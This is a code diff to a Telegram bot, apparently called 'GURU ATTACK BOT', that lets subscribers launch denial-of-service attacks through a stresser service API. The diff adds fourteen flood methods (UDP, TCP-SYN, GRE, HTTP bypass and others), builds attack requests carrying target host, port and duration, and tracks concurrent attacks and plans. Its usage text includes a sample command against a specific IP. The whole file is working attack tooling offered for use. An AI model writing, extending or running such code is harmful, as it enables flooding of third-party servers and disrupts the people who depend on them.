@@ -1,4 +1,4 @@
-# app.py - UPDATED FOR NEW API WITH 8 CONCURRENT ATTACKS
+# app.py - UPDATED FOR MRSTRESSER API WITH CORRECT PARAMETERS
 import os
 import logging
 import asyncio
@@ -7,6 +7,7 @@ import aiohttp
 import time
 import random
 import string
+import json
 from datetime import datetime, timedelta
 from flask import Flask, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -33,19 +34,43 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 
-# NEW CONCURRENT SETTINGS
-MAX_CONCURRENT_PER_USER = 2  # Each user can run 2 attacks at once
-MAX_TOTAL_CONCURRENT = 8     # Total attacks running globally
+# CONCURRENT SETTINGS
+MAX_CONCURRENT_PER_USER = 2
+MAX_TOTAL_CONCURRENT = 8
 MIN_DURATION = 30
 MAX_DURATION = 60
 MIN_COOLDOWN = 30
 MAX_COOLDOWN = 70
 
-# Attack Methods
+# UPDATED ATTACK METHODS - MrStresser API Methods
 ATTACK_METHODS = [
-    "UDP", "DNS", "TCP", "HTTP", "ICMP", 
-    "VSE", "SAMP", "RUST", "STEAM", "NUKER"
+    # UDP Methods
+    "UDP-FLOOD", "UDP-VSE", "UDP-DNS",
+    # TCP Methods  
+    "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
+    # ICMP
+    "ICMP-FLOOD", "GRE-FLOOD",
+    # Layer7
+    "TLSV2", "HTTPS-MIX", "HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER"
 ]
+
+# Map display names to API method names
+METHOD_MAP = {
+    "UDP-FLOOD": "udp-flood",
+    "UDP-VSE": "udp-vse", 
+    "UDP-DNS": "udp-dns",
+    "TCP-SYN": "tcp-syn",
+    "TCP-ACK": "tcp-ack",
+    "TCP-STOMP": "tcp-stomp",
+    "TCP-HANDSHAKE": "tcp-handshake",
+    "ICMP-FLOOD": "icmp-flood",
+    "GRE-FLOOD": "gre-flood",
+    "TLSV2": "TLSV2",
+    "HTTPS-MIX": "HTTPS-MIX",
+    "HTTP-KILLER": "HTTP-KILLER",
+    "HTTP-DESTROYER": "HTTP-DESTROYER",
+    "HTTP-BYPASSER": "HTTP-BYPASSER"
+}
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -735,7 +760,7 @@ def init_pseudo_owner():
 init_owner()
 init_pseudo_owner()
 
-# ===== ATTACK MANAGER - 8 CONCURRENT TOTAL, 2 PER USER =====
+# ===== ATTACK MANAGER =====
 class AttackManager:
     def __init__(self):
         self.active_attacks = {}
@@ -751,14 +776,11 @@ class AttackManager:
         self.attack_queue = []
         self.processing_queue = False
         
-        # GLOBAL COOLDOWN - affects ALL users
         self.global_cooldown_active = False
         self.global_cooldown_end = None
         self.last_attack_user = None
         self.last_attack_time = None
         self.last_attack_duration = 0
-        
-        # TRACK USER ATTACKS
         self.user_active_attacks = {}
     
     def get_cooldown_time(self, duration):
@@ -771,17 +793,14 @@ class AttackManager:
     
     def can_start_attack(self, user_id):
         with self.lock:
-            # Check GLOBAL cooldown
             if self.global_cooldown_active and self.global_cooldown_end:
                 if datetime.now() < self.global_cooldown_end:
                     remaining = int((self.global_cooldown_end - datetime.now()).total_seconds())
                     return False, f"🌍 *Global Cooldown Active*\n\nWait {remaining}s before next attack.\nLast attack by: {self.last_attack_user}"
             
-            # Check TOTAL concurrent attacks
             if self.concurrent_busy >= MAX_TOTAL_CONCURRENT:
                 return False, f"❌ Global limit reached ({self.concurrent_busy}/{MAX_TOTAL_CONCURRENT})"
             
-            # Check USER concurrent attacks
             user_attacks = self.user_active_attacks.get(user_id, 0)
             if user_attacks >= MAX_CONCURRENT_PER_USER:
                 return False, f"❌ You have reached your limit ({user_attacks}/{MAX_CONCURRENT_PER_USER})"
@@ -800,10 +819,8 @@ class AttackManager:
             self.current_attack_duration = duration
             self.attack_end_time = datetime.now() + timedelta(seconds=duration + 5)
             
-            # Track user attacks
             self.user_active_attacks[user_id] = self.user_active_attacks.get(user_id, 0) + 1
             
-            # Set GLOBAL cooldown
             self.global_cooldown_active = True
             cooldown = self.get_cooldown_time(duration)
             self.global_cooldown_end = datetime.now() + timedelta(seconds=cooldown)
@@ -831,7 +848,6 @@ class AttackManager:
                 self.active_attacks[attack_id]['status'] = 'stopped'
                 self.concurrent_busy = max(0, self.concurrent_busy - 1)
                 
-                # Decrease user attack count
                 if user_id in self.user_active_attacks:
                     self.user_active_attacks[user_id] = max(0, self.user_active_attacks[user_id] - 1)
                     if self.user_active_attacks[user_id] == 0:
@@ -1020,7 +1036,7 @@ async def send_attack_alert(attack_info):
         logger.error(f"Alert error: {e}")
 
 # ===== UPDATED API ATTACK FOR MRSTRESSER =====
-async def send_api_attack(target, port, duration, user_id, context, method="UDP", attack_num=1):
+async def send_api_attack(target, port, duration, user_id, context, method="UDP-FLOOD", attack_num=1):
     """
     Send attack to MrStresser API
     URL: https://mrstresser.com/api?key=API_KEY&host=TARGET&port=PORT&time=TIME&method=METHOD
@@ -1038,18 +1054,25 @@ async def send_api_attack(target, port, duration, user_id, context, method="UDP"
         )
         return None
     
+    # Get the correct method name from mapping
+    api_method = METHOD_MAP.get(method.upper(), "udp-flood")
+    
     # Build URL with parameters
     params = {
         "key": api_key,
         "host": target,
-        "port": port,
-        "time": duration,
-        "method": method.lower()
+        "port": str(port),
+        "time": str(duration),
+        "method": api_method
     }
+    
+    # Optional parameters - you can add these based on user input
+    # params["concs"] = "2"  # Concurrents
+    # params["req_method"] = "GET"  # For Layer7 attacks
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept": "application/json, text/html",
         "Accept-Encoding": "gzip, deflate",
         "Connection": "keep-alive"
     }
@@ -1059,8 +1082,9 @@ async def send_api_attack(target, port, duration, user_id, context, method="UDP"
         text=f"🔥 *ATTACK STARTING*\n\n"
              f"🎯 Target: `{target}:{port}`\n"
              f"⏱️ Duration: `{duration}s`\n"
-             f"📡 Method: `{method.upper()}`\n"
-             f"🔄 Status: Sending attack...",
+             f"📡 Method: `{method}`\n"
+             f"🔄 API Method: `{api_method}`\n"
+             f"📊 Status: Sending attack...",
         parse_mode='Markdown'
     )
     
@@ -1069,14 +1093,23 @@ async def send_api_attack(target, port, duration, user_id, context, method="UDP"
         async with aiohttp.ClientSession(timeout=timeout) as session:
             start_time = time.time()
             
+            logger.info(f"📤 Sending API request: {api_url} with params: {params}")
+            
             # Send attack request
             async with session.get(api_url, params=params, headers=headers) as response:
                 elapsed = time.time() - start_time
                 response_text = await response.text()
                 
-                logger.info(f"Attack ({method}) - Status: {response.status}, Time: {elapsed:.2f}s")
+                logger.info(f"📥 API Response - Status: {response.status}, Time: {elapsed:.2f}s")
+                logger.info(f"📥 Response Text: {response_text[:200]}")
                 
-                # Update status during attack
+                # Parse response
+                try:
+                    response_data = json.loads(response_text)
+                except:
+                    response_data = {"status": "unknown", "message": response_text[:100]}
+                
+                # Start timer
                 timer_task = asyncio.create_task(update_timer_single(status_msg, duration, target, port, method))
                 
                 # Wait for attack duration
@@ -1085,36 +1118,53 @@ async def send_api_attack(target, port, duration, user_id, context, method="UDP"
                 # Cancel timer
                 timer_task.cancel()
                 
-                # Final status
+                # Check response
                 if response.status == 200:
-                    success_text = (
-                        f"✅ *ATTACK COMPLETE!*\n\n"
-                        f"🎯 Target: `{target}:{port}`\n"
-                        f"⏱️ Duration: `{duration}s`\n"
-                        f"📡 Method: `{method.upper()}`\n"
-                        f"✅ Status: Attack Sent Successfully\n"
-                        f"⏱️ Response Time: `{elapsed:.2f}s`\n"
-                        f"📊 Response: `{response_text[:50]}`\n\n"
-                        f"⚡ Attacks Running: {attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}"
-                    )
+                    # Check if attack was successful
+                    if response_data.get('status') == 'success':
+                        success_text = (
+                            f"✅ *ATTACK COMPLETE!*\n\n"
+                            f"🎯 Target: `{target}:{port}`\n"
+                            f"⏱️ Duration: `{duration}s`\n"
+                            f"📡 Method: `{method}`\n"
+                            f"✅ Status: Attack Sent Successfully\n"
+                            f"⏱️ Response Time: `{elapsed:.2f}s`\n"
+                            f"📊 API Method: `{api_method}`\n"
+                            f"📊 Response: `{response_text[:100]}`\n\n"
+                            f"⚡ Attacks Running: {attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}"
+                        )
+                    else:
+                        # API returned error
+                        error_msg = response_data.get('message', 'Unknown error')
+                        success_text = (
+                            f"⚠️ *ATTACK MAY HAVE FAILED*\n\n"
+                            f"🎯 Target: `{target}:{port}`\n"
+                            f"⏱️ Duration: `{duration}s`\n"
+                            f"📡 Method: `{method}`\n"
+                            f"❌ API Error: `{error_msg}`\n"
+                            f"📊 Response: `{response_text[:100]}`\n\n"
+                            f"⚡ Attacks Running: {attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}"
+                        )
                     
                     await status_msg.edit_text(success_text, parse_mode='Markdown')
                     
                     return {
-                        "success": True,
+                        "success": response_data.get('status') == 'success',
                         "status": response.status,
                         "elapsed": elapsed,
                         "response": response_text[:100],
                         "method": method,
+                        "api_method": api_method,
                         "target": target,
                         "port": port,
-                        "duration": duration
+                        "duration": duration,
+                        "api_response": response_data
                     }
                 else:
                     error_text = (
                         f"❌ *ATTACK FAILED*\n\n"
                         f"🎯 Target: `{target}:{port}`\n"
-                        f"📡 Method: `{method.upper()}`\n"
+                        f"📡 Method: `{method}`\n"
                         f"❌ Error: HTTP {response.status}\n"
                         f"📊 Response: `{response_text[:100]}`"
                     )
@@ -1133,7 +1183,7 @@ async def send_api_attack(target, port, duration, user_id, context, method="UDP"
             f"❌ *ATTACK TIMEOUT*\n\n"
             f"🎯 Target: `{target}:{port}`\n"
             f"⏱️ Duration: `{duration}s`\n"
-            f"📡 Method: `{method.upper()}`\n"
+            f"📡 Method: `{method}`\n"
             f"Error: Connection timed out",
             parse_mode='Markdown'
         )
@@ -1167,7 +1217,7 @@ async def send_api_attack(target, port, duration, user_id, context, method="UDP"
             "method": method
         }
 
-async def update_timer_single(status_msg, duration, target, port, method="UDP"):
+async def update_timer_single(status_msg, duration, target, port, method="UDP-FLOOD"):
     """Update timer for single attack"""
     try:
         start_time = time.time()
@@ -1187,7 +1237,7 @@ async def update_timer_single(status_msg, duration, target, port, method="UDP"):
                         f"🔥 *ATTACK RUNNING*\n\n"
                         f"🎯 Target: `{target}:{port}`\n"
                         f"⏱️ Duration: `{duration}s`\n"
-                        f"📡 Method: `{method.upper()}`\n"
+                        f"📡 Method: `{method}`\n"
                         f"⏳ Time Remaining: `{remaining}s`\n"
                         f"⚡ Active Attacks: `{attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`\n"
                         f"📊 Your Attacks: `{attack_manager.user_active_attacks.get(status_msg.chat_id, 0)}/{MAX_CONCURRENT_PER_USER}`\n\n"
@@ -1216,9 +1266,9 @@ async def check_api_status():
         params = {
             "key": api_key,
             "host": "8.8.8.8",
-            "port": 53,
-            "time": 1,
-            "method": "udp"
+            "port": "53",
+            "time": "1",
+            "method": "udp-flood"
         }
         
         timeout = aiohttp.ClientTimeout(total=10)
@@ -1229,7 +1279,16 @@ async def check_api_status():
                 response_text = await response.text()
                 
                 if response.status == 200:
-                    return True, f"✅ Connected to MrStresser (Response: {elapsed:.2f}s)"
+                    try:
+                        data = json.loads(response_text)
+                        if data.get('status') == 'success':
+                            return True, f"✅ Connected to MrStresser (Response: {elapsed:.2f}s)"
+                        else:
+                            return True, f"✅ API Connected - Status: {data.get('message', 'OK')} (Response: {elapsed:.2f}s)"
+                    except:
+                        return True, f"✅ API Connected (Response: {elapsed:.2f}s)"
+                elif response.status == 403:
+                    return False, "❌ API Key Invalid or Expired"
                 elif response.status == 503:
                     return False, "⚠️ API is temporarily unavailable (503)"
                 else:
@@ -1625,7 +1684,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 3:
         await update.message.reply_text(
             f"❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
-            f"Example: `/attack 91.108.17.41 32001 60 UDP`\n\n"
+            f"Example: `/attack 91.108.17.41 32001 60 UDP-FLOOD`\n\n"
             f"⚡ Total Concurrent: {MAX_TOTAL_CONCURRENT}\n"
             f"👤 Per User: {MAX_CONCURRENT_PER_USER}\n"
             f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
@@ -1639,9 +1698,9 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(args[1])
         duration = int(args[2])
         
-        method = args[3].upper() if len(args) > 3 else "UDP"
+        method = args[3].upper() if len(args) > 3 else "UDP-FLOOD"
         if method not in ATTACK_METHODS:
-            method = "UDP"
+            method = "UDP-FLOOD"
         
         if duration < MIN_DURATION:
             await update.message.reply_text(f"❌ Minimum duration is {MIN_DURATION} seconds!")
@@ -1821,7 +1880,7 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(parts[1])
         duration = int(parts[2])
         
-        method = context.user_data.get('attack_method', 'UDP')
+        method = context.user_data.get('attack_method', 'UDP-FLOOD')
         
         if duration < MIN_DURATION or duration > MAX_DURATION:
             await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
@@ -1892,7 +1951,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "📌 Features:\n"
                 f"• {MAX_CONCURRENT_PER_USER}x Concurrent attacks\n"
                 f"• {MAX_TOTAL_CONCURRENT} total concurrent attacks\n"
-                "• Multiple attack methods\n"
+                "• All 14 attack methods\n"
                 "• Unlimited attacks"
             )
         else:
@@ -1903,7 +1962,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "📌 Features:\n"
                 f"• {MAX_CONCURRENT_PER_USER}x Concurrent attacks\n"
                 f"• {MAX_TOTAL_CONCURRENT} total concurrent attacks\n"
-                "• Multiple attack methods\n"
+                "• All 14 attack methods\n"
                 "• Unlimited attacks"
             )
     
@@ -2484,20 +2543,20 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     status, message = await check_api_status()
     
     status_text = (
-        f"🔌 API STATUS\n\n"
+        f"🔌 *API STATUS*\n\n"
         f"{message}\n\n"
         f"📊 API Key: {'✅ Set' if API_KEY else '❌ Missing'}\n"
         f"📊 API URL: {os.getenv('API_URL', 'Not set')}\n"
-        f"🔄 Method: Multiple\n"
-        f"📡 Available: {', '.join(ATTACK_METHODS)}\n"
-        f"⚡ Total Concurrent: {MAX_TOTAL_CONCURRENT}\n"
+        f"🔄 Total Concurrent: {MAX_TOTAL_CONCURRENT}\n"
         f"👤 Per User: {MAX_CONCURRENT_PER_USER}\n"
+        f"📡 Available Methods: {len(ATTACK_METHODS)}\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
         f"🌐 Status: {'🟢 ONLINE' if '✅' in message else '🔴 OFFLINE'}"
     )
     
     await query.edit_message_text(
         status_text,
+        parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton("🔄 REFRESH", callback_data="owner_api_status")],
             [InlineKeyboardButton("🔙 BACK", callback_data="owner")]
@@ -2927,9 +2986,8 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⏳ Remaining: {stats['remaining']}s\n"
         f"🌍 Global Cooldown: {stats['global_cooldown_remaining']}s\n"
         f"⏳ Queue Size: {stats['queue_size']}\n"
-        f"🎯 Method: Multiple\n"
+        f"🎯 Methods: {len(ATTACK_METHODS)}\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
-        f"📡 Methods: {', '.join(ATTACK_METHODS)}\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: {pause_status}\n\n"
         f"📌 /attack IP PORT TIME [METHOD]",
@@ -3064,15 +3122,14 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("👑 GURU ATTACK BOT - ULTIMATE VERSION")
+    print("👑 GURU ATTACK BOT - MRSTRESSER VERSION")
     print(f"⚡ TOTAL CONCURRENT: {MAX_TOTAL_CONCURRENT}")
     print(f"👤 PER USER: {MAX_CONCURRENT_PER_USER}")
     print("📌 Global Cooldown & Queue System")
     print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
-    print("📡 Methods: " + ", ".join(ATTACK_METHODS))
+    print(f"📡 Methods: {len(ATTACK_METHODS)} methods")
     print("📌 API: MrStresser (mrstresser.com)")
     print("📌 Owner & Pseudo_Owner have equal powers")
-    print("📌 Broadcast: Text, Photos, Videos")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
